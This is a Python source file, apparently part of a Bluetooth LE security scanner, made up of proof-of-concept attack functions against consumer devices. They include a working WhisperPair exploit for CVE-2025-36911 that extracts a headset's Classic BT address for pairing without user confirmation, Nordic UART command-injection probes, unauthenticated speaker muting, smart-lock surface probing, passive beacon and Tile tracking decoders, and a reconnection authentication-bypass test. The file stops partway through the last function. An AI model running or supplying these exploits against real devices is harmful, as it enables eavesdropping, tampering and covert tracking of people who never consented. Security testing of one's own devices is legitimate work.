def _local_bt_mac(adapter: str = "hci0") -> str:
    """Read the local adapter's BD_ADDR from sysfs."""
    try:
        with open(f"/sys/class/bluetooth/{adapter}/address") as f:
            return f.read().strip().upper()
    except OSError:
        return "00:00:00:00:00:00"


def _mac_to_bytes(mac: str) -> bytes:
    """Convert 'AA:BB:CC:DD:EE:FF' → bytes, MSB first."""
    return bytes(int(x, 16) for x in mac.split(":"))


def _bytes_to_mac(b: bytes) -> str:
    return ":".join(f"{x:02X}" for x in b)


def _build_kbp_request(seeker_mac: str, provider_mac: str = "00:00:00:00:00:00",
                       key: bytes = _ZERO_KEY) -> bytes:
    """
    Build and encrypt a Fast Pair Key-Based Pairing request block.

    Plaintext layout (16 bytes, per Fast Pair spec §3.1.1):
      [0]     Message type: 0x00 (KBP Request)
      [1]     Flags:        0x00 (action request disabled)
      [2-7]   Provider BR/EDR address  (6 bytes, MSB first)
      [8-13]  Seeker  BR/EDR address   (6 bytes, MSB first)
      [14-15] Random salt              (2 bytes)
    """
    import os
    plaintext = (
        bytes([0x00, 0x00])
        + _mac_to_bytes(provider_mac)
        + _mac_to_bytes(seeker_mac)
        + os.urandom(2)
    )
    return _aes_ecb_encrypt(key, plaintext)


async def poc_whisperpair(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
    adapter: str = "hci0",
) -> list[WriteResult]:
    """
    WhisperPair PoC — CVE-2025-36911

    Exploit flow:
      1. Verify device advertises Google Fast Pair (0xFE2C service UUID).
      2. Connect without pairing.
      3. Locate the Key-Based Pairing (KBP) GATT characteristic.
      4. Subscribe to KBP notifications.
      5. Write a crafted KBP request encrypted with the zero-key (16 × 0x00).
         A patched device ignores requests when not in pairing mode;
         a vulnerable device responds unconditionally.
      6. If a response notification arrives within 5 s, attempt zero-key
         decryption to extract the device's BR/EDR address from bytes [1-6].
      7. Report: vulnerability confirmed, leaked address, and severity.

    Requires: cryptography>=2.0 (pip install cryptography)
    """
    results: list[WriteResult] = []

    _log(log_cb, f"[WHISPERPAIR] CVE-2025-36911 probe on {dev.mac} ({dev.name})")

    # ── 1. Pre-flight: check Fast Pair service ────────────────────────────────
    fp_svc_present = (
        _FP_SVC in [s.uuid.lower() for s in dev.services]
        or _FP_SVC in [u.lower() for u in dev.adv_uuids]
    )
    if not fp_svc_present:
        _log(log_cb, "[WHISPERPAIR] ✗ No Google Fast Pair service (0xFE2C) — device not a candidate")
        return []

    _log(log_cb, "[WHISPERPAIR] ✓ Fast Pair service detected — proceeding")

    # ── 2. Resolve KBP characteristic ────────────────────────────────────────
    kbp_char = _find_char(dev, _FP_KBP)
    if kbp_char is None:
        _log(log_cb, f"[WHISPERPAIR]   KBP char not pre-enumerated — will discover on connect")

    seeker_mac = _local_bt_mac(adapter)
    _log(log_cb, f"[WHISPERPAIR] ► Seeker (our) address : {seeker_mac}")
    _log(log_cb, f"[WHISPERPAIR] ► Provider (target) MAC: {dev.mac}")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[WHISPERPAIR] ✗ Connection failed")
                return []

            _log(log_cb, "[WHISPERPAIR] ✓ Connected (no pairing)")

            # Discover KBP char from live services if not pre-enumerated
            if kbp_char is None:
                for svc in client.services:
                    for char in svc.characteristics:
                        if char.uuid.lower() == _FP_KBP:
                            kbp_char = GATTCharacteristic(
                                uuid=char.uuid,
                                handle=char.handle,
                                properties=list(char.properties),
                            )
                            break
                    if kbp_char:
                        break

            if kbp_char is None:
                _log(log_cb, "[WHISPERPAIR] ✗ KBP characteristic not found on device — not Fast Pair capable")
                return []

            _log(log_cb, f"[WHISPERPAIR] ✓ KBP char: {kbp_char.uuid}  handle=0x{kbp_char.handle:04X}")

            # ── 3. Subscribe to KBP notifications ────────────────────────────
            response_event = asyncio.Event()
            response_data: list[bytes] = []

            def _on_kbp_notify(_, data: bytearray):
                response_data.append(bytes(data))
                response_event.set()

            try:
                await client.start_notify(kbp_char.handle, _on_kbp_notify)
                _log(log_cb, "[WHISPERPAIR] ✓ Subscribed to KBP notifications")
            except Exception as e:
                _log(log_cb, f"[WHISPERPAIR] ✗ Could not subscribe to notifications: {e}")
                return []

            # ── 4. Build and send zero-key KBP request ───────────────────────
            kbp_payload = _build_kbp_request(seeker_mac, dev.mac, key=_ZERO_KEY)
            _log(log_cb, f"[WHISPERPAIR] ► Sending zero-key KBP request: {kbp_payload.hex()}")

            try:
                await asyncio.wait_for(
                    client.write_gatt_char(kbp_char.handle, kbp_payload, response=True),
                    timeout=5.0,
                )
                results.append(WriteResult(
                    mac=dev.mac, char_uuid=kbp_char.uuid,
                    payload=kbp_payload, success=True, response=None, error=None,
                ))
                _log(log_cb, "[WHISPERPAIR] ✓ KBP write accepted")
            except Exception as e:
                _log(log_cb, f"[WHISPERPAIR] ✗ KBP write rejected: {e}")
                _log(log_cb, "[WHISPERPAIR]   Device likely patched or not in Fast Pair mode")
                return results

            # ── 5. Wait for response notification (5 s window) ───────────────
            _log(log_cb, "[WHISPERPAIR] ► Waiting for KBP response notification (5 s) ...")
            try:
                await asyncio.wait_for(response_event.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                _log(log_cb, "[WHISPERPAIR] ✗ No response received within 5 s")
                _log(log_cb, "[WHISPERPAIR]   Device appears patched — ignores KBP when not in pairing mode")
                return results

            raw_resp = response_data[0]
            _log(log_cb, f"[WHISPERPAIR] ✓ Response received: {raw_resp.hex()}")
            _log(log_cb, "[WHISPERPAIR] ⚠ VULNERABLE — device responded to unauthenticated KBP request!")

            results.append(WriteResult(
                mac=dev.mac, char_uuid=kbp_char.uuid,
                payload=kbp_payload, success=True, response=raw_resp, error=None,
            ))

            # ── 6. Attempt zero-key decryption to extract BR/EDR address ─────
            if len(raw_resp) >= 16:
                try:
                    plaintext = _aes_ecb_decrypt(_ZERO_KEY, raw_resp[:16])
                    # KBP Response layout: [0]=0x01  [1-6]=Provider BR/EDR addr  [7-15]=salt
                    if plaintext[0] == 0x01:
                        leaked_mac = _bytes_to_mac(plaintext[1:7])
                        dev.firmware = dev.firmware or ""  # ensure field exists
                        _log(log_cb, f"[WHISPERPAIR] ✓ Zero-key decrypt SUCCESS")
                        _log(log_cb, f"[WHISPERPAIR] ► Leaked BR/EDR address: [bright_red]{leaked_mac}[/]")
                        _log(log_cb, f"[WHISPERPAIR]   This address can be used to initiate Classic BT pairing")
                        _log(log_cb, f"[WHISPERPAIR]   gaining microphone/audio access without user confirmation")
                    else:
                        _log(log_cb, f"[WHISPERPAIR]   Decrypted (raw): {plaintext.hex()} — type byte 0x{plaintext[0]:02X} unexpected")
                        _log(log_cb, f"[WHISPERPAIR]   Device responded but uses a non-zero session key (ECDH validated)")
                        _log(log_cb, f"[WHISPERPAIR]   Vulnerability confirmed (responded when not in pairing mode)")
                except Exception as e:
                    _log(log_cb, f"[WHISPERPAIR]   Decrypt attempt failed: {e}")
                    _log(log_cb, f"[WHISPERPAIR]   Vulnerability confirmed (device responded), BR/EDR addr encrypted")
            else:
                _log(log_cb, f"[WHISPERPAIR]   Response too short ({len(raw_resp)} bytes) to decrypt")

            try:
                await client.stop_notify(kbp_char.handle)
            except Exception:
                pass

            _log(log_cb, f"[WHISPERPAIR] ✓ PoC complete — {len(results)} interactions recorded")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "WHISPERPAIR", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "WHISPERPAIR", e)

    return results


# ── Nordic UART command injection (ADV-UART-001, ADV-UART-002) ───────────────

_NORDIC_UART_SVC = "6e400001-b5a3-f393-e0a9-e50e24dcca9e"
_NORDIC_UART_TX  = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"  # Notify (device → host)
_NORDIC_UART_RX  = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"  # Write  (host → device)

_UART_PROBES = [
    (b"AT\r\n",           "AT probe"),
    (b"HELP\r\n",         "HELP command"),
    (b"VERSION\r\n",      "VERSION query"),
    (b"STATUS\r\n",       "STATUS query"),
    (b"INFO\r\n",         "INFO query"),
    (b"\x00",             "NUL byte"),
    (b"\xFF\xFF",         "0xFFFF fuzz"),
    (b"AT+NAME?\r\n",     "AT+NAME query"),
    (b"AT+BAUD?\r\n",     "AT+BAUD query"),
    (b"\x01\x02\x03\x04", "Structured probe"),
]


async def poc_nordic_uart(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    Nordic UART Service (NUS) command injection probe.

    Connects without pairing, subscribes TX notifications, then sends a set of
    AT-style and binary probe strings to the RX characteristic.  Captures any
    responses for analysis.  Demonstrates ADV-UART-001/ADV-UART-002: devices
    exposing NUS without authentication allow arbitrary command injection.
    """
    results: list[WriteResult] = []
    responses: list[bytes] = []

    _log(log_cb, f"[NORDIC-UART] Connecting to {dev.mac} ({dev.name}) ...")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, f"[NORDIC-UART] ✗ Connection failed")
                return results

            _log(log_cb, f"[NORDIC-UART] ✓ Connected")

            # Locate TX (notify) and RX (write) characteristics by UUID
            tx_char = None
            rx_char = None
            for svc in client.services:
                for ch in svc.characteristics:
                    if ch.uuid.lower() == _NORDIC_UART_TX:
                        tx_char = ch
                    elif ch.uuid.lower() == _NORDIC_UART_RX:
                        rx_char = ch

            if rx_char is None:
                _log(log_cb, "[NORDIC-UART] ✗ RX characteristic not found — NUS not available on this device")
                return results

            _log(log_cb, f"[NORDIC-UART] ✓ RX char: {_NORDIC_UART_RX}")

            # Subscribe TX notifications if available
            if tx_char is not None and "notify" in tx_char.properties:
                def _on_notify(handle, data: bytearray):
                    responses.append(bytes(data))
                    _log(log_cb, f"[NORDIC-UART] ◄ Response [{len(data)}B]: {bytes(data).hex()}  "
                                 f"({bytes(data).decode('utf-8', errors='replace')})")

                try:
                    await client.start_notify(tx_char, _on_notify)
                    _log(log_cb, f"[NORDIC-UART] ✓ Subscribed TX notifications")
                except Exception as e:
                    _log(log_cb, f"[NORDIC-UART] ⚠ Could not subscribe TX: {e}")

            # Send probes
            _log(log_cb, f"[NORDIC-UART] ► Sending {len(_UART_PROBES)} probe strings ...")
            for data, label in _UART_PROBES:
                try:
                    await asyncio.wait_for(
                        client.write_gatt_char(_NORDIC_UART_RX, data, response=False),
                        timeout=WRITE_TIMEOUT,
                    )
                    results.append(WriteResult(
                        mac=dev.mac, char_uuid=_NORDIC_UART_RX,
                        payload=data, success=True, response=None, error=None,
                    ))
                    _log(log_cb, f"[NORDIC-UART] ► Sent [{label}]: {data.hex()}")
                except Exception as e:
                    results.append(WriteResult(
                        mac=dev.mac, char_uuid=_NORDIC_UART_RX,
                        payload=data, success=False, response=None, error=str(e),
                    ))
                    _log(log_cb, f"[NORDIC-UART] ✗ [{label}] failed: {e}")
                await asyncio.sleep(0.3)

            # Wait briefly for any delayed responses
            await asyncio.sleep(0.8)

            if tx_char is not None:
                try:
                    await client.stop_notify(tx_char)
                except Exception:
                    pass

            ok = sum(1 for r in results if r.success)
            _log(log_cb, f"[NORDIC-UART] ✓ PoC complete — {ok}/{len(results)} writes succeeded, "
                         f"{len(responses)} response(s) captured")
            if responses:
                _log(log_cb, "[NORDIC-UART] ⚠ VULNERABLE — device responded to unauthenticated NUS commands!")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "NORDIC-UART", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "NORDIC-UART", e)

    return results


# ── BLE Volume Control Service speaker control (ADV-SPEAKER-002) ──────────────

_VCS_SVC   = "00001844-0000-1000-8000-00805f9b34fb"
_VCS_STATE = "00002b7d-0000-1000-8000-00805f9b34fb"  # Volume State (read/notify)
_VCS_CP    = "00002b7e-0000-1000-8000-00805f9b34fb"  # Volume Control Point (write)

# VCS opcodes (Bluetooth SIG Assigned Numbers)
_VCS_OP_RELATIVE_VOL_DOWN = 0x00
_VCS_OP_RELATIVE_VOL_UP   = 0x01
_VCS_OP_UNMUTE_VOL_DOWN   = 0x02
_VCS_OP_UNMUTE_VOL_UP     = 0x03
_VCS_OP_SET_ABS_VOLUME    = 0x04
_VCS_OP_UNMUTE            = 0x05
_VCS_OP_MUTE              = 0x06


async def poc_speaker_control(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    BLE Volume Control Service (VCS) unauthenticated speaker control.

    Reads the current volume/mute state, then issues mute → set-volume-0 →
    restore commands without any pairing or authentication.  Demonstrates
    ADV-SPEAKER-002: any device in range can silence or hijack audio volume.
    """
    results: list[WriteResult] = []

    _log(log_cb, f"[VCS] Connecting to {dev.mac} ({dev.name}) ...")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[VCS] ✗ Connection failed")
                return results

            _log(log_cb, "[VCS] ✓ Connected")

            # Find VCS characteristics
            state_char = None
            cp_char = None
            for svc in client.services:
                for ch in svc.characteristics:
                    if ch.uuid.lower() == _VCS_STATE:
                        state_char = ch
                    elif ch.uuid.lower() == _VCS_CP:
                        cp_char = ch

            if cp_char is None:
                _log(log_cb, "[VCS] ✗ Volume Control Point not found")
                return results

            # Read current state: [volume_setting, mute, change_counter]
            change_counter = 0x00
            original_volume = 100
            if state_char is not None and "read" in state_char.properties:
                try:
                    raw = bytes(await client.read_gatt_char(state_char))
                    if len(raw) >= 3:
                        original_volume = raw[0]
                        muted = raw[1]
                        change_counter = raw[2]
                        _log(log_cb, f"[VCS] ► Current state: volume={original_volume}/255  "
                                     f"mute={bool(muted)}  counter={change_counter}")
                    results.append(WriteResult(
                        mac=dev.mac, char_uuid=_VCS_STATE,
                        payload=b"", success=True, response=raw, error=None,
                    ))
                except Exception as e:
                    _log(log_cb, f"[VCS] ⚠ Could not read Volume State: {e}")

            async def _vcs_write(opcode: int, extra: bytes = b"") -> bool:
                cmd = bytes([opcode, change_counter]) + extra
                try:
                    await asyncio.wait_for(
                        client.write_gatt_char(_VCS_CP, cmd, response=True),
                        timeout=WRITE_TIMEOUT,
                    )
                    results.append(WriteResult(
                        mac=dev.mac, char_uuid=_VCS_CP,
                        payload=cmd, success=True, response=None, error=None,
                    ))
                    return True
                except Exception as e:
                    results.append(WriteResult(
                        mac=dev.mac, char_uuid=_VCS_CP,
                        payload=cmd, success=False, response=None, error=str(e),
                    ))
                    _log(log_cb, f"[VCS] ✗ opcode=0x{opcode:02X} failed: {e}")
                    return False

            # Step 1: Mute
            _log(log_cb, "[VCS] ► Sending MUTE command ...")
            ok = await _vcs_write(_VCS_OP_MUTE)
            if ok:
                _log(log_cb, "[VCS] ⚠ MUTE accepted — unauthenticated volume control confirmed!")
                change_counter = (change_counter + 1) & 0xFF
                await asyncio.sleep(0.5)

                # Step 2: Set absolute volume to 0
                _log(log_cb, "[VCS] ► Sending SET_ABS_VOLUME = 0 ...")
                await _vcs_write(_VCS_OP_SET_ABS_VOLUME, bytes([0x00]))
                change_counter = (change_counter + 1) & 0xFF
                await asyncio.sleep(0.5)

                # Step 3: Restore original volume and unmute
                _log(log_cb, f"[VCS] ► Restoring volume to {original_volume} ...")
                await _vcs_write(_VCS_OP_SET_ABS_VOLUME, bytes([original_volume]))
                change_counter = (change_counter + 1) & 0xFF
                await asyncio.sleep(0.3)
                await _vcs_write(_VCS_OP_UNMUTE)
                _log(log_cb, "[VCS] ✓ Volume restored")
            else:
                _log(log_cb, "[VCS] ℹ Device rejected unauthenticated VCS write — likely requires bonding")

            _log(log_cb, f"[VCS] ✓ PoC complete — {sum(1 for r in results if r.success)}/{len(results)} ops succeeded")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "VCS", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "VCS", e)

    return results


# ── Smart lock unauthenticated access probe (ADV-LOCK-001) ────────────────────

_LOCK_SVCS = {
    "00003a77-0000-1000-8000-00805f9b34fb",  # August Smart Lock
    "9a66f400-0084-42da-aed1-bc60b8a02476",  # Noke padlock
    "a92ee100-5501-11e4-916c-0800200c9a66",  # Schlage Encode
    "fe03",                                   # Yale BT (short UUID)
    "4fafc201-1fb5-459e-8fcc-c5c9c331914b",  # Generic DIY lock (ESP32)
}
_LOCK_KEYWORDS = [
    "lock", "deadbolt", "padlock", "door", "entry", "access",
    "august", "schlage", "yale", "kwikset", "noke", "igloohome",
    "level", "ultraloq", "weiser",
]


async def poc_smart_lock_probe(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    Smart lock unauthenticated access probe (ADV-LOCK-001).

    Connects without pairing and attempts to read all accessible characteristics
    and subscribe to notifications for 5 seconds.  Reports any data exposed
    without authentication — command injection or unlock commands are intentionally
    NOT sent; this is an information-gathering / surface-mapping probe only.
    """
    results: list[WriteResult] = []

    _log(log_cb, f"[LOCK-PROBE] Connecting to {dev.mac} ({dev.name}) ...")
    _log(log_cb, "[LOCK-PROBE] ℹ Read-only probe — no unlock commands will be sent")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[LOCK-PROBE] ✗ Connection failed")
                return results

            _log(log_cb, "[LOCK-PROBE] ✓ Connected without pairing")

            readable_count = 0
            notify_count = 0
            notify_data: list[tuple[str, bytes]] = []

            def _on_notify(handle, data: bytearray):
                notify_data.append((str(handle), bytes(data)))
                _log(log_cb, f"[LOCK-PROBE] ◄ Notify [{handle}]: {bytes(data).hex()}  "
                             f"({bytes(data).decode('utf-8', errors='replace')})")

            # Enumerate and read all accessible characteristics
            for svc in client.services:
                _log(log_cb, f"[LOCK-PROBE]   Service: {svc.uuid}  ({svc.description})")
                for ch in svc.characteristics:
                    props = ch.properties
                    if "read" in props:
                        try:
                            val = bytes(await client.read_gatt_char(ch))
                            readable_count += 1
                            _log(log_cb, f"[LOCK-PROBE]   ✓ Read [{ch.uuid}]: {val.hex()}  "
                                         f"({val.decode('utf-8', errors='replace')})")
                            results.append(WriteResult(
                                mac=dev.mac, char_uuid=ch.uuid,
                                payload=b"", success=True, response=val, error=None,
                            ))
                        except Exception as e:
                            _log(log_cb, f"[LOCK-PROBE]   ✗ Read [{ch.uuid}] denied: {e}")
                            results.append(WriteResult(
                                mac=dev.mac, char_uuid=ch.uuid,
                                payload=b"", success=False, response=None, error=str(e),
                            ))
                    if "notify" in props or "indicate" in props:
                        try:
                            await client.start_notify(ch, _on_notify)
                            notify_count += 1
                        except Exception:
                            pass

            # Collect notifications for 5 seconds
            if notify_count > 0:
                _log(log_cb, f"[LOCK-PROBE] ► Listening for {notify_count} notification source(s) for 5s ...")
                await asyncio.sleep(5.0)
                for ch in [c for s in client.services for c in s.characteristics
                           if "notify" in c.properties or "indicate" in c.properties]:
                    try:
                        await client.stop_notify(ch)
                    except Exception:
                        pass

            _log(log_cb, f"[LOCK-PROBE] ✓ Probe complete — "
                         f"{readable_count} readable chars, {len(notify_data)} notifications")
            if readable_count > 0 or notify_data:
                _log(log_cb, "[LOCK-PROBE] ⚠ Data accessible without authentication — ADV-LOCK-001 confirmed")

    except BleakError as e:
        _log_connection_error(log_cb, dev, "LOCK-PROBE", e)
    except Exception as e:
        _log_connection_error(log_cb, dev, "LOCK-PROBE", e)

    return results


# ── iBeacon / Eddystone / Tile passive decode (ADV-IBEACON-001) ──────────────

_TILE_SVC = "0000feed-0000-1000-8000-00805f9b34fb"
_EDDYSTONE_SVC = "0000feaa-0000-1000-8000-00805f9b34fb"


def _decode_ibeacon(payload: bytes) -> dict | None:
    """Parse Apple iBeacon advertisement payload (type=0x02, length=0x15)."""
    if len(payload) < 2 or payload[0] != 0x02 or payload[1] != 0x15:
        return None
    if len(payload) < 23:
        return None
    uuid_bytes = payload[2:18]
    uuid_str = (f"{uuid_bytes[0:4].hex()}-{uuid_bytes[4:6].hex()}-"
                f"{uuid_bytes[6:8].hex()}-{uuid_bytes[8:10].hex()}-"
                f"{uuid_bytes[10:16].hex()}")
    major = int.from_bytes(payload[18:20], "big")
    minor = int.from_bytes(payload[20:22], "big")
    tx_power = payload[22] if payload[22] < 128 else payload[22] - 256
    return {"uuid": uuid_str, "major": major, "minor": minor, "tx_power": tx_power}


def _decode_eddystone(frame: bytes) -> dict | None:
    """Parse an Eddystone frame (UID / URL / TLM)."""
    if not frame:
        return None
    ftype = frame[0]
    if ftype == 0x00 and len(frame) >= 18:  # UID
        namespace = frame[2:12].hex()
        instance = frame[12:18].hex()
        return {"type": "UID", "namespace": namespace, "instance": instance}
    if ftype == 0x10 and len(frame) >= 4:   # URL
        schemes = {0x00: "http://www.", 0x01: "https://www.",
                   0x02: "http://", 0x03: "https://"}
        expansions = {0x00: ".com/", 0x01: ".org/", 0x02: ".edu/",
                      0x03: ".net/", 0x04: ".info/", 0x05: ".biz/",
                      0x06: ".gov/", 0x07: ".com", 0x08: ".org",
                      0x09: ".edu", 0x0A: ".net", 0x0B: ".info",
                      0x0C: ".biz", 0x0D: ".gov"}
        url = schemes.get(frame[2], "?")
        for b in frame[3:]:
            url += expansions.get(b, chr(b) if 32 <= b < 127 else "?")
        return {"type": "URL", "url": url}
    if ftype == 0x20 and len(frame) >= 14:  # TLM
        batt_mv = int.from_bytes(frame[2:4], "big")
        temp_raw = int.from_bytes(frame[4:6], "big", signed=False)
        temp_c = temp_raw / 256.0
        adv_cnt = int.from_bytes(frame[6:10], "big")
        sec_cnt = int.from_bytes(frame[10:14], "big")
        return {"type": "TLM", "battery_mv": batt_mv, "temp_c": round(temp_c, 2),
                "adv_count": adv_cnt, "uptime_sec": sec_cnt}
    return {"type": f"unknown_0x{ftype:02X}", "raw": frame.hex()}


async def poc_ibeacon_track(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    Passive iBeacon / Eddystone / Tile advertisement decode (ADV-IBEACON-001).

    No BLE connection is made.  Parses advertisement data already present in
    the BTDevice object to extract:
      - iBeacon UUID + major/minor/tx_power (precise location context fingerprint)
      - Eddystone-UID namespace/instance, Eddystone-URL, Eddystone-TLM telemetry
      - Tile tracker service presence
    Demonstrates passive surveillance capability: tracking without consent.
    """
    results: list[WriteResult] = []
    found_anything = False

    _log(log_cb, f"[BEACON-TRACK] Passive decode for {dev.mac} ({dev.name})")
    _log(log_cb, "[BEACON-TRACK] ℹ No connection required — parsing advertisement data only")

    # ── iBeacon (Apple 0x004C, subtype 0x02) ────────────────────────────────
    apple_data = dev.manufacturer_data.get(0x004C)
    if apple_data:
        parsed = _decode_ibeacon(bytes(apple_data))
        if parsed:
            found_anything = True
            _log(log_cb, f"[BEACON-TRACK] ✓ iBeacon detected")
            _log(log_cb, f"[BEACON-TRACK]   Proximity UUID : {parsed['uuid']}")
            _log(log_cb, f"[BEACON-TRACK]   Major          : {parsed['major']}")
            _log(log_cb, f"[BEACON-TRACK]   Minor          : {parsed['minor']}")
            _log(log_cb, f"[BEACON-TRACK]   TX Power       : {parsed['tx_power']} dBm")
            _log(log_cb, "[BEACON-TRACK] ⚠ UUID+major+minor uniquely identify this beacon — "
                         "enables precise tracking without consent")
            results.append(WriteResult(
                mac=dev.mac, char_uuid="adv:manufacturer:0x004C",
                payload=bytes(apple_data), success=True,
                response=str(parsed).encode(), error=None,
            ))
        else:
            subtype = apple_data[0] if apple_data else None
            _log(log_cb, f"[BEACON-TRACK]   Apple manufacturer data present (subtype=0x{subtype:02X if subtype is not None else '??'})")

    # ── Eddystone (service UUID 0000feaa) ────────────────────────────────────
    eddy_key = _EDDYSTONE_SVC
    eddy_frame = dev.service_data.get(eddy_key)
    if eddy_frame is None:
        # Also try short form
        for k, v in dev.service_data.items():
            if "feaa" in k.lower():
                eddy_frame = v
                break
    if eddy_frame:
        parsed = _decode_eddystone(bytes(eddy_frame))
        if parsed:
            found_anything = True
            ftype = parsed.get("type", "?")
            _log(log_cb, f"[BEACON-TRACK] ✓ Eddystone-{ftype} detected")
            if ftype == "UID":
                _log(log_cb, f"[BEACON-TRACK]   Namespace : {parsed['namespace']}")
                _log(log_cb, f"[BEACON-TRACK]   Instance  : {parsed['instance']}")
                _log(log_cb, "[BEACON-TRACK] ⚠ UID uniquely identifies this beacon for cross-location tracking")
            elif ftype == "URL":
                _log(log_cb, f"[BEACON-TRACK]   URL : {parsed['url']}")
            elif ftype == "TLM":
                _log(log_cb, f"[BEACON-TRACK]   Battery  : {parsed['battery_mv']} mV")
                _log(log_cb, f"[BEACON-TRACK]   Temp     : {parsed['temp_c']} °C")
                _log(log_cb, f"[BEACON-TRACK]   Uptime   : {parsed['uptime_sec']} s")
                _log(log_cb, f"[BEACON-TRACK]   Adv cnt  : {parsed['adv_count']}")
            results.append(WriteResult(
                mac=dev.mac, char_uuid="adv:service_data:0xfeaa",
                payload=bytes(eddy_frame), success=True,
                response=str(parsed).encode(), error=None,
            ))

    # ── Tile tracker ─────────────────────────────────────────────────────────
    adv_lower = [u.lower() for u in dev.adv_uuids]
    svc_lower  = [s.uuid.lower() for s in dev.services]
    if _TILE_SVC in adv_lower or _TILE_SVC in svc_lower:
        found_anything = True
        _log(log_cb, "[BEACON-TRACK] ✓ Tile tracker detected (service UUID 0000feed)")
        _log(log_cb, f"[BEACON-TRACK]   MAC : {dev.mac}")
        _log(log_cb, "[BEACON-TRACK] ⚠ ADV-TRACKER-001: Tile BT LE address persists and enables passive tracking")
        results.append(WriteResult(
            mac=dev.mac, char_uuid="adv:service_uuid:0xfeed",
            payload=b"", success=True, response=b"tile_tracker", error=None,
        ))

    if not found_anything:
        _log(log_cb, "[BEACON-TRACK] ℹ No iBeacon/Eddystone/Tile data found in advertisement")
        _log(log_cb, f"[BEACON-TRACK]   Protocol detected as: {dev.protocol}")
        _log(log_cb, "[BEACON-TRACK]   Apple mfr data (0x004C): " +
                     (bytes(apple_data).hex() if apple_data else "not present"))

    _log(log_cb, f"[BEACON-TRACK] ✓ Decode complete — {len(results)} finding(s)")
    return results


# ── Reconnection auth-bypass probe (BLESA-style) ─────────────────────────────
#
# Tests whether a device skips re-authentication after a clean disconnect.
# Three phases:
#   Phase 1  — confirm which auth-gated chars are actually blocked (baseline)
#   Phase 2  — reconnect immediately, re-test the confirmed-blocked chars
#   Phase 3  — wait 3 s, reconnect, re-test (catches timing-window bypasses)
#
# A blocked→allowed transition in phase 2 or 3 is an auth-bypass finding.


@dataclass
class ReconnectBypass:
    char_uuid: str
    description: str
    operation: str          # "read" | "write"
    phase1: str             # "allowed" | "blocked" | "error" | "timeout"
    phase2: str             # same + "skipped"
    phase3: str             # same
    bypass: bool            # True = was blocked, then allowed
    read_value: bytes | None = None   # data if a read bypass succeeded
    severity: str = "INFO"
    detail: str = ""


# ATT error strings that mean "access rejected due to security requirements"
_AUTH_ERRS = ("auth", "encrypt", "insufficient", "not permitted")
_AUTH_CODES = ("0x02", "0x03", "0x05", "0x08", "0x0f")


async def _probe_access(
    client: BleakClient,
    char: GATTCharacteristic,
    operation: str,
    op_timeout: float = 3.0,
) -> tuple[str, bytes | None]:
    """
    Attempt a single read or write on char.
    Returns (outcome, value_or_None):
      outcome: "allowed" | "blocked" | "timeout" | "error"
    """
    try:
        if operation == "read":
            raw = await asyncio.wait_for(
                client.read_gatt_char(char.handle or char.uuid),
                timeout=op_timeout,
            )
            return "allowed", bytes(raw)
        else:
            use_resp = "write" in char.properties
            await asyncio.wait_for(
                client.write_gatt_char(
                    char.handle or char.uuid, b"\x00", response=use_resp
                ),
                timeout=op_timeout,
            )
            return "allowed", None
    except asyncio.TimeoutError:
        return "timeout", None
    except BleakError as e:
        err = str(e).lower()
        if any(k in err for k in _AUTH_ERRS) or any(c in err for c in _AUTH_CODES):
            return "blocked", None
        return "error", None
    except Exception:
        return "error", None


async def _probe_phase(
    dev: BTDevice,
    targets: list[tuple[GATTCharacteristic, str]],
    label: str,
    timeout: float,
    log_fn,
) -> dict[tuple[str, str], tuple[str, bytes | None]]:
    """
    Connect once, probe all (char, operation) targets, disconnect.
    Returns {(uuid, operation): (outcome, value)}.
    Logs each result via log_fn.
    """
    results: dict[tuple[str, str], tuple[str, bytes | None]] = {}
    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                log_fn(f"[RECONNECT] ✗ {label}: could not connect")
                return results
            for char, op in targets:
                outcome, value = await _probe_access(client, char, op)
                results[(char.uuid, op)] = (outcome, value)
                bypass_mark = "  ← BYPASS!" if outcome == "allowed" else ""
                log_fn(
                    f"[RECONNECT]   {label}  {op:5}  "
                    f"{char.uuid[:8]}…  [{outcome.upper():8}]{bypass_mark}"
                )
    except asyncio.TimeoutError:
        log_fn(f"[RECONNECT] ✗ {label}: connection timeout")
    except BleakError as e:
        from scanner.writer import _is_not_found_err, _not_found_msg
        if _is_not_found_err(e):
            clear_cached_ble_device(dev.mac)
            log_fn(f"[RECONNECT] ✗ {label}: {_not_found_msg(dev)}")
        else:
            log_fn(f"[RECONNECT] ✗ {label}: BLE error: {e}")
    except Exception as e:
        log_fn(f"[RECONNECT] ✗ {label}: unexpected error: {e}")
    return results


async def poc_reconnect_auth_bypass(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[ReconnectBypass]:
    """
    BLESA-style reconnection auth-bypass probe.

    Connects without pairing three times. Detects whether the device skips
    re-authentication on subsequent connections, exposing characteristics
    that correctly required auth on the first connection.
    """
    def _log(msg: str):
        log.info(msg)
        if log_cb:
            log_cb(msg)

    if not dev.gatt_enumerated:
        _log("[RECONNECT] GATT not yet enumerated — run GATT probe first")
        return []

    # Collect auth-gated targets: char has the property but was blocked during enum
